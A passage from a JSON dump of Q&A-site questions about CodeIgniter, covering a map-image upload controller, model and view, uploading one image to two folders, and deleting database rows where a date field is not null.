$this-&gt;load-&gt;model('maps_model');\n        echo 'inside true';exit;\n        // Upload map\n        if ($this-&gt;maps_model-&gt;upload_map())\n        {\n            redirect(site_url('admin/maps'));\n        }\n    }\n}\n</code></pre>\n\n<p>Model:</p>\n\n<pre><code>public function upload_map()\n{\n    $config['upload_path'] = root_path() . 'space/maps/';\n    $config['allowed_types'] = 'gif|jpg|png';\n    $this-&gt;load-&gt;library('upload', $config);\n\n    $map_name = $this-&gt;input-&gt;post('map_name');\n\n    if ( ! $this-&gt;upload-&gt;do_upload('map_file'))\n    {\n        $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        echo $this-&gt;upload-&gt;display_errors();exit;\n        return FALSE;\n    }\n    else\n    {\n        $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n        // Insert map into database\n        $options = array(\n                    'm_file' =&gt; $data['upload_data']['file_name'],\n                    'm_name' =&gt; $map_name\n                 );\n        $this-&gt;insert_map($options);\n\n        // Create a thumbnail of this map\n        $this-&gt;generate_map_thumb($data['upload_data']['file_name']);\n    }\n\n    return TRUE;\n}\n</code></pre>\n\n<p>View:</p>\n\n<pre><code>&lt;div class=\"modalContent\" style=\"width: 300px; height: 250px;\"&gt;\n&lt;h1&gt;&lt;?php echo $title; ?&gt;&lt;/h1&gt;\n\n&lt;?php echo validation_errors(); ?&gt;\n\n&lt;div id=\"MAP_FORM\" class=\"formListing\"&gt;\n    &lt;?php echo form_open_multipart('admin/new_map'); ?&gt;\n\n    &lt;ul&gt;\n        &lt;li&gt;        \n            &lt;div&gt;&lt;label&gt;File: &lt;/label&gt;&lt;/div&gt;\n            &lt;div&gt;&lt;span&gt;&lt;input type=\"file\" id=\"MAP_FILE\" name=\"map_file\" /&gt;&lt;/span&gt;&lt;/div&gt;\n        &lt;/li&gt;\n        &lt;li&gt;      \n            &lt;div&gt;&lt;label&gt;Name: &lt;/label&gt;&lt;/div&gt;\n            &lt;div&gt;&lt;span&gt;&lt;input type=\"text\" id=\"MAP_NAME\" name=\"map_name\" value=\"\" /&gt;&lt;/span&gt;&lt;/div&gt;\n        &lt;/li&gt;\n    &lt;/ul&gt;\n\n    &lt;br /&gt;\n    &lt;input type=\"submit\" value=\"Submit\" id=\"SUBMIT_MAP\" name=\"submit_map\" /&gt;\n\n    &lt;?php echo form_close(); ?&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p></p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12243502,"title":"CodeIgniter upload one image to two directory","body":"<p>I would like to upload one image to different directory in CodeIgniter, so one images are stored in 2 folders.</p>\n\n<p>Path one etc/www/image1/ and path two etc/www/image2/</p>\n\n<p>Code </p>\n\n<pre><code>$config[‘upload_path’] =‘etc/www/image1/’;\n$config[‘allowed_types’] = ‘jpg|jpeg|gif|png’;\n$config[‘file_name’]=“imageone.jpg”;\n$config[‘max_size’] = ‘10000’;\n\n$this-&gt;upload-&gt;initialize($config); \nif(!$this-&gt;upload-&gt;do_upload(‘userfile’)){\necho $this-&gt;upload-&gt;display_errors();\n}else {\n$this-&gt;upload-&gt;data(‘userfile’);\n} \n</code></pre>\n"},{"tags":["sql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12199047,"title":"Deleting multiple rows in SQL/codeigniter","body":"<p>This doesnt seem to work:</p>\n\n<pre><code> /// delete emails first\n         $this-&gt;db-&gt;where('DateSent', 'DateSent!=NULL');\n        $this-&gt;db-&gt;delete('Emails');\n</code></pre>\n\n<p>I guess I need to use a loop. Not sure how to go about doing this. Can anyone help?</p>\n\n<p>Cheers</p>\n"}]}
